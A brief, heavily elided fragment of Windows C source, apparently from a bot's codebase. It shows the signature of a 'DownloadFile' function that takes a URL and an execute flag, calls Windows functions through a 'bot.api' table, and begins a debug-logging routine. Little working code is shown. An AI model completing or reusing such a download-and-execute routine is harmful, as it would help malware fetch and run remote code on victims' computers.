...
BOOL WINAPI DownloadFile(const LPSTR pszURL, BOOL bExecute)
{
	...
	bot.api.pMultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, pszURL, StrLengthA(pszURL), (LPWSTR)&wzURL, 255);

	// URLDownloadToFile deprecated
...
void WINAPI WriteDebugData(const LPSTR pszData)
{
	IO_STATUS_BLOCK io;
	NTSTATUS s;
